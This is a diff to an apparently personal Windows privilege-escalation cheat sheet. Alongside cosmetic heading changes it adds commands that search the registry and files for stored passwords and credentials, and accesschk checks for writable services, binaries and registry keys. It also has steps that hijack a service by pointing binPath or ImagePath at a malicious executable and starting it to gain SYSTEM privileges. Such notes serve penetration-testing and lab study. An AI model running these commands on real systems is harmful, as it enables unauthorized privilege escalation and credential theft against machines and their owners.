@@ -13,30 +13,43 @@ Get-LocalGroup
 Get-LocalGroupMember <GROUP-NAME>
 ```
 
-## Check for Credentials
+## 🔹Check for Credentials🔹
 
 ```
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
-```
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+findstr /si password *.xml *.ini *.txt
+dir /s *pass* == *cred* == *vnc* == *.config*
 
 ```
-icacls FILE
-```
 
-###### get env variables
+
+
+## 🔹ENV variables🔹
 
 ```
 Get-ChildItem
 Env:$env:PATH
 ```
 
-## File permissions
+## 🔹File permissions🔹
+
+```
+icacls FILE
+```
 
 
+## 🔹Acccess Permission🔹
+```
+accesschk.exe /accepteula -dqv "C:\Python27"
+cacls "C:\Python27"
+```
 
-# Services 
+# ⭐ Services ⭐
+- Is there a service that runs as SYSTEM but is writable by all logged-on users?  (NT AUTHORITY\INTERACTIVE)
 
-## Manage Service
+## 🔸Manage Service🔸
 ```
 Get-Service
 Get-Service | Select-Object Displayname,Status,ServiceName,Can*
@@ -49,6 +62,9 @@ Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Ob
 
 sc.exe stop <SERVICE>
 sc.exe start <SERVICE>
+
+# Is SERVICE_START_NAME = LocalSystem? -> SYSTEM Privileges?
+# Check if writable by all logged-on users (NT AUTHORITY\INTERACTIVE)
 sc.exe qc <SERVICE>
 sc.exe delete <SERVICE>
 
@@ -62,7 +78,7 @@ sc.exe config <SERVICE> binPath="C:\Users\Quickemu\Downloads\malicious.exe"
 sc.exe create <SERVICE-NAME> binPath="<PATH-TO-EXECUTABLE>"
 ```
 
-## Weak Permissins on Service
+## 🔸Weak Permissins on Service🔸
 
  Use the `accesschk64' program to check if we have privileges over that process.
 
@@ -88,6 +104,9 @@ accesschk.exe /accepteula -ucqv Spooler
 # List permissions for a specific directory:
 accesschk.exe /accepteula -dqv "C:\Users"
 
+# (BINARY_PATH_NAME) file is writable?
+accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+
 # Find all weak folder:
 accesschk.exe /accepteula -uwdqs Users C:\
 accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\
@@ -102,7 +121,7 @@ accesschk.exe /accepteula -uwqs "Authenticated Users" C:\*.*
 accesschk.exe /accepteula -uwcqv "Authenticated Users" *
 ```
 
-## Weak Permission on Service Binary
+## 🔸Weak Permission on Service Binary🔸
 ```
 # Get binary path
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
@@ -123,11 +142,25 @@ sc.exe stop SimpleService
 sc.exe start SimpleService
 ```
 
-## Unquoted Service Path
+## 🔸Unquoted Service Path🔸
 ```
 C:\Users\Quickemu\Downloads\Example Directory\Another.exe
 C:\Users\Quickemu\Downloads\Example.exe
+```
 
+## 🔸Weak Registry Permissions🔸
+```
+# Is SERVICE_START_NAME = LocalSystem? -> SYSTEM Privileges?
+sc.exe qc <SERVICE>
+
+# Check if writable by all logged-on users (NT AUTHORITY\INTERACTIVE)
+accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+
+# Overwrite the ImagePath to malicious executable
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\malware.exe /f
+
+# Start
+net start regsvc
 ```
 
 
